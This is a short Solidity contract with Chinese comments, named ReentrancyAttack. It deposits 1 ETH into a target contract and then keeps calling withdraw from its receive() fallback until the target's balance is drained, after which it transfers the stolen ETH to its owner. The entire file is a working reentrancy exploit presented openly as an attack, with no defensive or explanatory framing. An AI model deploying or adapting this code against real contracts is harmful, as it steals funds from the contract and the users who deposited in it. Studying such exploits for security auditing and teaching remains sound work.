// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IBalance {
    function deposit() external payable;
    function withdraw(uint256 _amount) external;
}

contract ReentrancyAttack {
    IBalance public target;
    address public owner;

    constructor(address _target) {
        target = IBalance(_target);
        owner = msg.sender;
    }

    // 攻击入口，先存1 ETH，再开始攻击
    function attack() external payable {
        require(msg.value >= 1 ether, "Need at least 1 ETH");
        target.deposit{value: 1 ether}();
        target.withdraw(1 ether);
    }

    // 回退函数，收到ETH时再次调用withdraw
    receive() external payable {
        if (address(target).balance >= 1 ether) {
            target.withdraw(1 ether);
        } else {
            // 攻击结束，把钱转给owner
            payable(owner).transfer(address(this).balance);
        }
    }
}